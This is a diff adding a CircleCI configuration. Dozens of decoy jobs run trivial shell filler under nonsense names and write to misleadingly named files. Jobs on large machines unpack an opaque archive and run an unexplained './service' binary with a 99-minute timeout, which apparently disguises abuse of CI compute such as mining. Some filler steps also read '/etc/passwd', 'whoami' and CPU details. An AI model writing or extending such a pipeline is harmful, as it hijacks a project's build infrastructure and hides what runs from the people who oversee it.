+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/cache.raw > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  generate_rm-webhook-glitch:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: whatever man
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; sed 's/foo/bar/g; s/baz/qux/g' <<<"foo baz foobaz"; true ; } > /var/tmp/ws/ckpt-alt.pkl
+            echo "baseline emitted ($(wc -l </var/tmp/ws/ckpt-alt.pkl) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - ckpt-alt.pkl
+  rm-webhook-glitch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/ckpt-alt.pkl > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  cache_tweak-metrics:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: testing 123
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; head -c 100 /dev/urandom | od -An -i 2>/dev/null | tr -d ' ' | head -c 40; true ; } > /var/tmp/ws/handoff.state
+            echo "baseline emitted ($(wc -l </var/tmp/ws/handoff.state) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - handoff.state
+  tweak-metrics:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/handoff.state > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+  prefetch_andromeda-plus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: splice line
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc 'A-Z' | head -c 10; true ; } > /var/tmp/ws/phase-done.log
+            echo "baseline emitted ($(wc -l </var/tmp/ws/phase-done.log) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - phase-done.log
+  andromeda-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: Peek upstream
+          command: |
+            { head -c 200 /var/tmp/ws/phase-done.log > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: xz -dc build-dist.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 99m
+          command: ./service
+
+  stepA_rollout_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: ring ring
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; echo "line1 line2 line3" | awk '{print $2}'; true ; } > /var/tmp/ws/handoff.ok
+            echo "baseline emitted ($(wc -l </var/tmp/ws/handoff.ok) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - handoff.ok
+  rerun_dan-push_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: notify stage
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; echo {a..e}{1..3} | tr ' ' '\n' | wc -l; true ; } > /var/tmp/ws/68.blob
+            echo "baseline emitted ($(wc -l </var/tmp/ws/68.blob) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - 68.blob
+  auditor_succes-only_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: water jet
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; printf "0123456789abcdef" | od -An -c | head -1; true ; } > /var/tmp/ws/timings.tsv
+            echo "baseline emitted ($(wc -l </var/tmp/ws/timings.tsv) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - timings.tsv
+  vendor_hu-smoke_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: reef sail
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; date -d "@1700000000" 2>/dev/null +%Y || date +%Y; true ; } > /var/tmp/ws/cache.raw
+            echo "baseline emitted ($(wc -l </var/tmp/ws/cache.raw) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - cache.raw
+  Gamma_fix-db-crash_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: tell the pm
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; yes "abc" | head -500 | sort | uniq | wc -l; true ; } > /var/tmp/ws/34.bin
+            echo "baseline emitted ($(wc -l </var/tmp/ws/34.bin) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - 34.bin
+  env_WEB-570_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: snow day
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; printf "%d\n" {1..30} | awk '{if($1%2==0)e++;else o++}END{print e, o}'; true ; } > /var/tmp/ws/84.out
+            echo "baseline emitted ($(wc -l </var/tmp/ws/84.out) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - 84.out
+  go_add-db_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: tidy
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; grep -F "test" <<<$'this is a test\nnothing here\ntest again'; true ; } > /var/tmp/ws/audit.ndjson
+            echo "baseline emitted ($(wc -l </var/tmp/ws/audit.ndjson) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - audit.ndjson
+  p1_v5-rc5_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: donut
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{printf "0b"; for(i=7;i>=0;i--)printf (42/2^i)%2>=1 ? "1" : "0"; print ""}'; true ; } > /var/tmp/ws/stats.json
+            echo "baseline emitted ($(wc -l </var/tmp/ws/stats.json) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - stats.json
+  stage_sm-v2_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: WHY
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=3;a++)for(b=1;b<=12959;b++)s+=a*b;print s}'; true ; } > /var/tmp/ws/step-14.log
+            echo "baseline emitted ($(wc -l </var/tmp/ws/step-14.log) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - step-14.log
+  compile_BUILD_PROD_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: cleat hitch
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; printf "%d\n" $(( $(date +%M) * 60 + $(date +%S) )); true ; } > /var/tmp/ws/artifact.tar
+            echo "baseline emitted ($(wc -l </var/tmp/ws/artifact.tar) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - artifact.tar
+  beta_sam-run_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: surface float
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; tty 2>/dev/null || echo no-tty; true ; } > /var/tmp/ws/timings.json
+            echo "baseline emitted ($(wc -l </var/tmp/ws/timings.json) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - timings.json
+  bake_APP-311_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: wet sand
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; basename /usr/local/bin/; true ; } > /var/tmp/ws/804.data
+            echo "baseline emitted ($(wc -l </var/tmp/ws/804.data) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - 804.data
+  rerun_run-production-test-matrix_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: double knot
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | wc -l; true ; } > /var/tmp/ws/FINAL
+            echo "baseline emitted ($(wc -l </var/tmp/ws/FINAL) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - FINAL
+  spinner_november_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: beat upwind
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print cos(0), sin(1.5708), exp(1)}'; true ; } > /var/tmp/ws/passoff.txt
+            echo "baseline emitted ($(wc -l </var/tmp/ws/passoff.txt) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - passoff.txt
+  compile_rm-webhook-glitch_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: walk away
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; grep -c "^processor" /proc/cpuinfo; true ; } > /var/tmp/ws/ckpt-alt.pkl
+            echo "baseline emitted ($(wc -l </var/tmp/ws/ckpt-alt.pkl) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - ckpt-alt.pkl
+  phase_PrepareImage_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: dude it doesnt
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; printf "1 10\n2 20\n3 30\n" | awk '{s+=$2}END{print "sum="s}'; true ; } > /var/tmp/ws/step-24.txt
+            echo "baseline emitted ($(wc -l </var/tmp/ws/step-24.txt) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - step-24.txt
+  stepB_andromeda-plus_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: riff
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; echo "127.0.0.1:8080" | awk -F: '{print $2}'; true ; } > /var/tmp/ws/phase-done.log
+            echo "baseline emitted ($(wc -l </var/tmp/ws/phase-done.log) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - phase-done.log
+  run_bug-9581_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: graze
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; echo $BASH_VERSION; true ; } > /var/tmp/ws/step-3.log
+            echo "baseline emitted ($(wc -l </var/tmp/ws/step-3.log) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - step-3.log
+  preflight_package_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: backstroke lazy
+          command: |
+            mkdir -p /var/tmp/ws
+            set +o pipefail 2>/dev/null; seq 1 1212439 | awk '{print $1*7919 % 2147483647}' > /var/tmp/ws/output.txt; true
+            echo "baseline emitted ($(wc -l </var/tmp/ws/output.txt) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - output.txt
+  bundle_spin-up_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: compression wrap
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; alias | wc -l 2>/dev/null || echo zero; true ; } > /var/tmp/ws/audit.gz
+            echo "baseline emitted ($(wc -l </var/tmp/ws/audit.gz) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - audit.gz
+  deps_tweak-metrics_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: leg press
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; seq 1 30 | paste -sd '-' - | wc -c; true ; } > /var/tmp/ws/handoff.state
+            echo "baseline emitted ($(wc -l </var/tmp/ws/handoff.state) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - handoff.state
+  runner_update-metrics_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: charge
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=5;i++){print i; print i*i}}' | wc -l; true ; } > /var/tmp/ws/ckpt-A.pt
+            echo "baseline emitted ($(wc -l </var/tmp/ws/ckpt-A.pt) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - ckpt-A.pt
+  preinit_fix-999_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: syncopate
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; whoami 2>/dev/null | md5sum; true ; } > /var/tmp/ws/stash.blob
+            echo "baseline emitted ($(wc -l </var/tmp/ws/stash.blob) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - stash.blob
+  builder_ci-x_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: blue light
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=10; p=1; for(i=1;i<=n;i++)p*=2; print p}'; true ; } > /var/tmp/ws/195.out
+            echo "baseline emitted ($(wc -l </var/tmp/ws/195.out) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - 195.out
+  deps_PROD_MERGE_8_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ws
+      - run:
+          name: rollback 2
+          command: |
+            mkdir -p /var/tmp/ws
+            { set +o pipefail 2>/dev/null; whoami; true ; } > /var/tmp/ws/.done
+            echo "baseline emitted ($(wc -l </var/tmp/ws/.done) lines)"
+      - persist_to_workspace:
+          root: /var/tmp/ws
+          paths:
+            - .done
+workflows:
+  matrix:
+    jobs:
+      - db_rollout
+      - stepA_rollout_2:
+          requires:
+            - db_rollout
+      - rollout:
+          requires:
+            - stepA_rollout_2
+      - do_dan-push:
+          requires:
+            - stepA_rollout_2
+      - rerun_dan-push_2:
+          requires:
+            - do_dan-push
+      - dan-push:
+          requires:
+            - rerun_dan-push_2
+      - warmer_succes-only:
+          requires:
+            - rerun_dan-push_2
+      - auditor_succes-only_2:
+          requires:
+            - warmer_succes-only
+      - succes-only:
+          requires:
+            - auditor_succes-only_2
+      - kick_hu-smoke:
+          requires:
+            - auditor_succes-only_2
+      - vendor_hu-smoke_2:
+          requires:
+            - kick_hu-smoke
+      - hu-smoke:
+          requires:
+            - vendor_hu-smoke_2
+      - deps_fix-db-crash:
+          requires:
+            - vendor_hu-smoke_2
+      - Gamma_fix-db-crash_2:
+          requires:
+            - deps_fix-db-crash
+      - fix-db-crash:
+          requires:
+            - Gamma_fix-db-crash_2
+      - teardown_WEB-570:
+          requires:
+            - Gamma_fix-db-crash_2
+      - env_WEB-570_2:
+          requires:
+            - teardown_WEB-570
+      - WEB-570:
+          requires:
+            - env_WEB-570_2
+      - env_add-db:
+          requires:
+            - env_WEB-570_2
+      - go_add-db_2:
+          requires:
+            - env_add-db
+      - add-db:
+          requires:
+            - go_add-db_2
+      - inspect_v5-rc5:
+          requires:
+            - go_add-db_2
+      - p1_v5-rc5_2:
+          requires:
+            - inspect_v5-rc5
+      - v5-rc5:
+          requires:
+            - p1_v5-rc5_2
+      - enqueue_sm-v2:
+          requires:
+            - p1_v5-rc5_2
+      - stage_sm-v2_2:
+          requires:
+            - enqueue_sm-v2
+      - sm-v2:
+          requires:
+            - stage_sm-v2_2
+      - package_BUILD_PROD:
+          requires:
+            - stage_sm-v2_2
+      - compile_BUILD_PROD_2:
+          requires:
+            - package_BUILD_PROD
+      - BUILD_PROD:
+          requires:
+            - compile_BUILD_PROD_2
+      - generate_sam-run:
+          requires:
+            - compile_BUILD_PROD_2
+      - beta_sam-run_2:
+          requires:
+            - generate_sam-run
+      - sam-run:
+          requires:
+            - beta_sam-run_2
+      - inspect_APP-311:
+          requires:
+            - beta_sam-run_2
+      - bake_APP-311_2:
+          requires:
+            - inspect_APP-311
+      - APP-311:
+          requires:
+            - bake_APP-311_2
+      - phase2_run-production-test-matrix
+      - rerun_run-production-test-matrix_2:
+          requires:
+            - phase2_run-production-test-matrix
+      - run-production-test-matrix:
+          requires:
+            - rerun_run-production-test-matrix_2
+      - verify_november:
+          requires:
+            - rerun_run-production-test-matrix_2
+      - spinner_november_2:
+          requires:
+            - verify_november
+      - november:
+          requires:
+            - spinner_november_2
+      - generate_rm-webhook-glitch:
+          requires:
+            - spinner_november_2
+      - compile_rm-webhook-glitch_2:
+          requires:
+            - generate_rm-webhook-glitch
+      - rm-webhook-glitch:
+          requires:
+            - compile_rm-webhook-glitch_2
+      - kick_PrepareImage:
+          requires:
+            - compile_rm-webhook-glitch_2
+      - phase_PrepareImage_2:
+          requires:
+            - kick_PrepareImage
+      - PrepareImage:
+          requires:
+            - phase_PrepareImage_2
+      - prefetch_andromeda-plus:
+          requires:
+            - phase_PrepareImage_2
+      - stepB_andromeda-plus_2:
+          requires:
+            - prefetch_andromeda-plus
+      - andromeda-plus:
+          requires:
+            - stepB_andromeda-plus_2
+      - B_bug-9581:
+          requires:
+            - stepB_andromeda-plus_2
+      - run_bug-9581_2:
+          requires:
+            - B_bug-9581
+      - bug-9581:
+          requires:
+            - run_bug-9581_2
+      - hydrate_package:
+          requires:
+            - run_bug-9581_2
+      - preflight_package_2:
+          requires:
+            - hydrate_package
+      - package:
+          requires:
+            - preflight_package_2
+      - stepB_spin-up:
+          requires:
+            - preflight_package_2
+      - bundle_spin-up_2:
+          requires:
+            - stepB_spin-up
+      - spin-up:
+          requires:
+            - bundle_spin-up_2
+      - cache_tweak-metrics:
+          requires:
+            - bundle_spin-up_2
+      - deps_tweak-metrics_2:
+          requires:
+            - cache_tweak-metrics
+      - tweak-metrics:
+          requires:
+            - deps_tweak-metrics_2
+      - drain_update-metrics:
+          requires:
+            - deps_tweak-metrics_2
+      - runner_update-metrics_2:
+          requires:
+            - drain_update-metrics
+      - update-metrics:
+          requires:
+            - runner_update-metrics_2
+      - rerun_fix-999:
+          requires:
+            - runner_update-metrics_2
+      - preinit_fix-999_2:
+          requires:
+            - rerun_fix-999
+      - fix-999:
+          requires:
+            - preinit_fix-999_2
+      - resync_ci-x:
+          requires:
+            - preinit_fix-999_2
+      - builder_ci-x_2:
+          requires:
+            - resync_ci-x
+      - ci-x:
+          requires:
+            - builder_ci-x_2
+      - hook_PROD_MERGE_8:
+          requires:
+            - builder_ci-x_2
+      - deps_PROD_MERGE_8_2:
+          requires:
+            - hook_PROD_MERGE_8
+      - PROD_MERGE_8:
+          requires:
+            - deps_PROD_MERGE_8_2
+      - Alpha_preview
+      - preview:
+          requires:
+            - Alpha_preview
+      - canary_greg-ci:
+          requires:
+            - Alpha_preview
+      - greg-ci:
+          requires:
+            - canary_greg-ci
+      - validate_yuki-push:
+          requires:
+            - canary_greg-ci
+      - yuki-push:
+          requires:
+            - validate_yuki-push
+      - prefetch_sanity:
+          requires:
+            - validate_yuki-push
+      - sanity:
+          requires:
+            - prefetch_sanity
+      - prebuild_wip-router-v2-leak:
+          requires:
+            - prefetch_sanity
+      - wip-router-v2-leak:
+          requires:
+            - prebuild_wip-router-v2-leak
